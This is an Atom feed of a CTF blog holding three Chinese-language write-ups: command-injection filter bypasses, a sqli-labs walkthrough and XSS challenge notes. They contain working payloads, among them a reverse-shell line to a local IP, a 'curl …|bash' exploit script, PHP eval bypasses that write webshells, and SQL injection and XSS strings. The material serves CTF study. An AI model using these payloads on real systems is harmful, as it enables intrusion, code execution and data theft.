<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://prontosil.com/"/>
  <updated>2020-03-10T07:19:48.026Z</updated>
  <id>http://prontosil.com/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>命令执行绕过技巧</title>
    <link href="http://prontosil.com/posts/58281de6/"/>
    <id>http://prontosil.com/posts/58281de6/</id>
    <published>2020-03-10T07:17:49.000Z</published>
    <updated>2020-03-10T07:19:48.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><pre><code>?ip=1;tar$IFS$9-cvf$IFS$9index$IFS$9.</code></pre><p><img src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><pre><code class="php">&lt;?php$a = &quot;../ %1a whoami&quot;;$command = &#39;dir &#39;.urldecode($a);$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&#39;out.bat&#39;,$escaped_command);system(&#39;out.bat&#39;);?&gt;</code></pre><img src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><pre><code>|||&amp;&amp;;</code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre><code>~ ᐅ cat&lt;&gt;flag     flag{fffffffffff}~ ᐅ cat&lt;flag flag{fffffffffff}</code></pre><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><pre><code>~ ᐅ echo ${IFS} &gt; aa.txt~ ᐅ xxd aa.txt 00000000: 2009 0a00 0a                              ....//用python读取一下&gt;&gt;&gt; f = open(&quot;aa.txt&quot;)&gt;&gt;&gt; f.readlines()[&#39; \t\n&#39;, &#39;\x00\n&#39;]</code></pre><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><pre><code class="bash">ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><pre><code>~ ᐅ a=c;b=at;c=flag;$a$b $cflag{fffffffffff}</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><pre><code>~ ᐅ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashflag{fffffffffff}</code></pre><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><pre><code class="bash">~ ᐅ c&quot;&quot;at flagflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&quot;&quot;agflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&#39;&#39;agflag{fffffffffff}</code></pre><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><pre><code>~ ᐅ c\at fl\agflag{fffffffffff}</code></pre><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><pre><code class="php">&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);</code></pre><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import quotepayload = [    # generate `ls -t&gt;g` file    &#39;&gt;ls\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;-t\\&#39;,     &#39;&gt;\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,     # generate `curl orange.tw.tw|python`    # generate `curl 10.188.2.20|bash`     &#39;&gt;sh\ &#39;,     &#39;&gt;ba\\&#39;,     &#39;&gt;\|\\&#39;,    &#39;&gt;20\\&#39;,    &#39;&gt;2.\\&#39;,     &#39;&gt;8.\\&#39;,    &#39;&gt;18\\&#39;,     &#39;&gt;0.\\&#39;,     &#39;&gt;1\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # exec    &#39;sh _&#39;,     &#39;sh g&#39;, ]r = requests.get(&#39;http://10.188.2.20:22460/?reset=1&#39;)for i in payload:    assert len(i) &lt;= 5     r = requests.get(&#39;http://10.188.2.20:22460/?cmd=&#39; + quote(i) )    print i    sleep(0.2)</code></pre><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</code></pre><p><img src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;); //强制加入 -- 使得后面的成为参数的值    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>python中存在的漏洞点</p><pre><code class="python">import subprocessquery = &#39;id&#39;r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)</code></pre><p><img src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><pre><code class="php">&lt;?php$param = $_REQUEST[&#39;param&#39;];if(strlen($param)&lt;17 &amp;&amp; stripos($param,&#39;eval&#39;) === false &amp;&amp; stripos($param,&#39;assert&#39;) === false) {  eval($param);}?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>param=`$_GET[1]`;&amp;1=bash</code></pre><p>或者</p><pre><code>param=exec($_GET[1]);</code></pre><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><pre><code>param=$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><pre><code># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw# 最后包含param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><pre><code>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</code></pre><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><pre><code>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET);</code></pre><p><img src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tar命令绕过&quot;&gt;&lt;a href=&quot;#tar命令绕过&quot; class=&quot;headerlink&quot; title=&quot;tar命令绕过&quot;&gt;&lt;/a&gt;tar命令绕过&lt;/h2&gt;&lt;p&gt;最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="命令执行" scheme="http://prontosil.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab记录</title>
    <link href="http://prontosil.com/posts/70df97a2/"/>
    <id>http://prontosil.com/posts/70df97a2/</id>
    <published>2020-03-10T07:14:56.000Z</published>
    <updated>2020-03-10T07:16:09.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一关-GET-Error-based-Single-quotes"><a href="#第一关-GET-Error-based-Single-quotes" class="headerlink" title="第一关 GET Error based- Single quotes"></a>第一关 GET Error based- Single quotes</h2><p>payload</p><pre><code>http://localhost/Less-1/?id=1&#39; order by 3 -- +</code></pre><p><img src="/posts/70df97a2/1581060199563.png" alt></p><p>(火狐不知道为什么感觉有bug)</p><p>在确定回显的时候，要注意去查一个不存在的数据</p><pre><code>http://localhost/Less-1/?id=888&#39; union select 1,2,3 --+</code></pre><h2 id="第二关-GET-Error-based-Intiger"><a href="#第二关-GET-Error-based-Intiger" class="headerlink" title="第二关 GET Error based-Intiger"></a>第二关 GET Error based-Intiger</h2><p>没有单引号保护</p><pre><code>http://localhost/Less-2/?id=12312 union select 1,2,3 #</code></pre><p><img src="/posts/70df97a2/1581060927106.png" alt></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>加了括号保护</p><pre><code class="sql">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><pre><code>http://localhost/Less-3/?id=22333&#39; ) union select 1,2,3 --+</code></pre><p><img src="/posts/70df97a2/1581061220464.png" alt></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号保护</p><pre><code>http://localhost/Less-4/?id=1111&quot;) union select 1,2,3--+</code></pre><p><img src="/posts/70df97a2/1581061432798.png" alt></p><h2 id="第五关-Double-injection-Single-Quotes"><a href="#第五关-Double-injection-Single-Quotes" class="headerlink" title="第五关  Double injection-Single Quotes"></a>第五关  Double injection-Single Quotes</h2><p>这里理解一下报错注入</p><pre><code class="sql">select count(*),(concat(floor(rand(0)*2),(select version())))x from users group by x</code></pre><p><code>floor(rand(0)*2)</code> 产生的数据很有规律</p><pre><code>mysql&gt; select floor(rand(0)*2) from users;+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 |+------------------+0110 1100</code></pre><p>再看 <code>group by</code></p><p>首先计算第一次 <code>group by</code> 后面的字段值，然后去查找有没有，没有就需要插入，插入的时候需要再计算一次</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考</a></p><p>在第三次插入的时候出问题</p><p>最后的payload</p><pre><code>http://localhost/Less-5/?id=2&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581062957254.png" alt></p><p>数据库也可以这样查</p><pre><code class="sql">mysql&gt; select group_concat(schema_name) from information_schema.schemata;+--------------------------------------------------------------------------------------------------------------------------------+| group_concat(schema_name)                                                                                                      |+--------------------------------------------------------------------------------------------------------------------------------+| information_schema,challenges,ctf,dvwa,ed01,mysql,newdb,performance_schema,reservation,security,sys,test,tptest,typecho,xinxiu |+--------------------------------------------------------------------------------------------------------------------------------+1 row in set</code></pre><p>简单一点的 payload</p><pre><code>http://localhost/Less-5/?id=1&#39; and (select 1 from (select count(*),  concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x )a) --+</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>同第五关类似</p><pre><code>http://localhost/Less-6/?id=2&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581063846151.png" alt></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>是写shell，但是我没有成功(其实是因为mysql开了权限吧估计)</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注(多加一些括号)</p><pre><code class="sql">http://localhost/Less-8/?id=1&#39; and (select ascii(mid((select database()), 1,1)))=115 --+</code></pre><p><img src="/posts/70df97a2/1581064726062.png" alt></p><h2 id="第九关-延时注入"><a href="#第九关-延时注入" class="headerlink" title="第九关 延时注入"></a>第九关 延时注入</h2><p>延时注入</p><pre><code class="sql">http://localhost/Less-9/?id=1&#39; and (select  if(ascii(substr(database(),1,1))&gt;200 , sleep(5), NULL) ) --+</code></pre><p><img src="/posts/70df97a2/1581065698494.png" alt></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>延时注入，只是换成了双引号</p><pre><code class="sql">http://localhost/Less-10/?id=1&quot; and (select if( ascii(substr(database(),1,1)) &gt; 40, sleep(5), NULL)) --+</code></pre><p><img src="/posts/70df97a2/1581065865089.png" alt></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>POST形式的单引号</p><pre><code>uname=&amp;passwd=admin&#39; union select 1,2-- +&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079686829.png" alt></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>POST形式的双引号</p><p>payload(这次测试发现 <code>--+</code> 不行，需要换成 #)</p><pre><code>uname=a&amp;passwd=admin&quot;) union select 1,2# &amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079951209.png" alt></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>有报错回显，但是并没有其他的数据回显</p><p><img src="/posts/70df97a2/1581080112218.png" alt></p><p>payload(遇到困难加括号就行了)</p><pre><code>uname=admin&amp;passwd=admin&#39;) and (select 1 from (select count(*), concat(floor(rand(0)*2),(select database()))x from information_schema.tables group by x)a)  #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581080519639.png" alt></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>同上一关类似</p><pre><code>uname=admin&amp;passwd=admin&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x  from information_schema.tables group by x)a)# &amp;submit=Submit</code></pre><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>延时注入,注意只能用 <code>#</code> 注释？</p><pre><code class="sql">uname=admin&amp;passwd=admin &#39; and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081075376.png" alt="明显看到延时"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>同十五关</p><pre><code>uname=admin&amp;passwd=admin&quot;) and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081206257.png" alt></p><h2 id="第十七关-报错注入"><a href="#第十七关-报错注入" class="headerlink" title="第十七关 报错注入"></a>第十七关 报错注入</h2><p>update形式的注入，这里可以使用 报错注入</p><pre><code>uname=admin&amp;passwd=admin&#39;  and (updatexml(1,concat(0x3a,(select database())),1)) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081624347.png" alt></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>payload</p><pre><code class="sql">User-Agent: 1&#39; or updatexml(1,concat(0x3a,(database())),0),&#39;&#39;,&#39;&#39;)#</code></pre><p><img src="/posts/70df97a2/1581082594671.png" alt></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>payload</p><pre><code>Referer:  1&#39; or updatexml(1,concat(0x3a,(database())),0), &#39;&#39;)#</code></pre><p>INSERT 形式的注入</p><p><img src="/posts/70df97a2/1581083050547.png" alt></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>cookie形式的报错注入</p><pre><code class="sql">admin&#39; and (updatexml(1,concat(0x3a,(select database())),1)) # </code></pre><p><img src="/posts/70df97a2/1581124084727.png" alt></p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p>需要base64编码</p><pre><code>admin&#39; ) and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>编码之后</p><pre><code>YWRtaW4nICkgYW5kICh1cGRhdGV4bWwoMSwgY29uY2F0KDB4M2EsIChzZWxlY3QgZGF0YWJhc2UoKSksMHgzYSApICwxKSkgIw==</code></pre><p><img src="/posts/70df97a2/1581124754782.png" alt></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>改成了双引号闭合</p><pre><code>admin&quot; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>base64编码之后</p><pre><code>YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsIGNvbmNhdCgweDNhLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4M2EgKSAsMSkpICM=</code></pre><p><img src="/posts/70df97a2/1581137685241.png" alt></p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p>这一次把注释符过滤了</p><p><img src="/posts/70df97a2/1581137728016.png" alt></p><pre><code class="php">$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code></pre><p>报错注入可以</p><pre><code>http://localhost/Less-23/?id=1&#39; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) and &#39;1&#39; =&#39;1</code></pre><p><img src="/posts/70df97a2/1581137879879.png" alt></p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p>二次注入，注册一个用户名 <code>admin &#39;#</code> 就可以修改admin的密码了</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p>过滤了 <code>and</code> 和 <code>or</code> ，</p><p>可以双写绕过或者使用 <code>&amp;&amp;</code> 和 <code>||</code></p><p><img src="/posts/70df97a2/1581138060996.png" alt></p><p><img src="/posts/70df97a2/1581138112434.png" alt></p><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><p>类似的过滤了and和or，而且没有单引号保护，双写绕过</p><p><img src="/posts/70df97a2/1581139222272.png" alt></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一关-GET-Error-based-Single-quotes&quot;&gt;&lt;a href=&quot;#第一关-GET-Error-based-Single-quotes&quot; class=&quot;headerlink&quot; title=&quot;第一关 GET Error based- Singl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="SQL" scheme="http://prontosil.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>XSS学习记录</title>
    <link href="http://prontosil.com/posts/88edfa78/"/>
    <id>http://prontosil.com/posts/88edfa78/</id>
    <published>2020-03-10T07:11:49.000Z</published>
    <updated>2020-03-10T07:16:09.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><pre><code> http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><pre><code> 没有找到和&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;相关的结果.</code></pre><p>但是</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;scRipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scRipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt;</code></pre><p>payload</p><pre><code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>那就不用</p><pre><code> &#39;onmouseover=&#39;alert(1)</code></pre><p>提交之后鼠标悬浮到上面即可触发</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>同样的绕过</p><pre><code> &quot; onmouseover=&quot;alert(1)</code></pre><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>但是现在会被过滤</p><pre><code>&lt;input name=keyword  value=&quot;&#39;o_nmouseover=&#39;alert(1)&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>那么事件不能用了</p><p>payload</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;</code></pre><p><img src="/posts/88edfa78/1581324449393.png" alt="img"></p><pre><code> &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;img sr_c=x o_nerror=alert(1)&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;       &lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(1);&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>payload：(大写可以绕过)</p><pre><code> &quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</code></pre><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><pre><code> &lt;form action=level7.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p><code>script</code> , <code>on</code>被过滤</p><p>payload</p><pre><code> &quot; oonninput=alert(1) &quot; &quot;oonnmouseover=&quot;alert(1)</code></pre><p>然后输入即可</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p><pre><code> 